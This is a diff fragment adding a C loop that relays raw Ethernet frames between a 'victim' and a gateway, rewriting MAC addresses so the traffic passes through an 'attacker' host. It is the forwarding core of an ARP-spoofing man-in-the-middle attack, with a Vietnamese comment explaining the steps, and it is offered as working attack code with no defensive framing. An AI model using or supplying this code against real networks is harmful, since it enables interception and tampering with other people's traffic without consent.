@@ -77,3 +77,40 @@ Chương trình sau đó thay đổi địa chỉ MAC nguồn trong header Ether
 Cuối cùng, chương trình chuyển tiếp gói tin trở lại nạn nhân.
 */
 
+// ...
+
+while (1) {
+    // Receive packet
+    ssize_t packetSize = recvfrom(sockfd, buffer, ETH_FRAME_LEN, 0, NULL, NULL);
+    if (packetSize < 0) {
+        perror("recvfrom");
+        continue;
+    }
+
+    // Check if the packet is from the victim
+    struct ether_header* ethHeader = (struct ether_header*)buffer;
+    if (memcmp(ethHeader->ether_shost, victimMAC, ETH_ALEN) == 0) {
+        // Modify the destination MAC address to the gateway's MAC address
+        memcpy(ethHeader->ether_dhost, gatewayMAC, ETH_ALEN);
+
+        // Forward the packet to the gateway
+        if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0) {
+            perror("sendto");
+            continue;
+        }
+    }
+    // Check if the packet is from the gateway
+    else if (memcmp(ethHeader->ether_shost, gatewayMAC, ETH_ALEN) == 0) {
+        // Modify the source MAC address to the attacker's MAC address
+        memcpy(ethHeader->ether_shost, localMAC, ETH_ALEN);
+
+        // Modify the destination MAC address to the victim's MAC address
+        memcpy(ethHeader->ether_dhost, victimMAC, ETH_ALEN);
+
+        // Forward the packet back to the victim
+        if (sendto(sockfd, buffer, packetSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0) {
+            perror("sendto");
+            continue;
+        }
+    }
+}
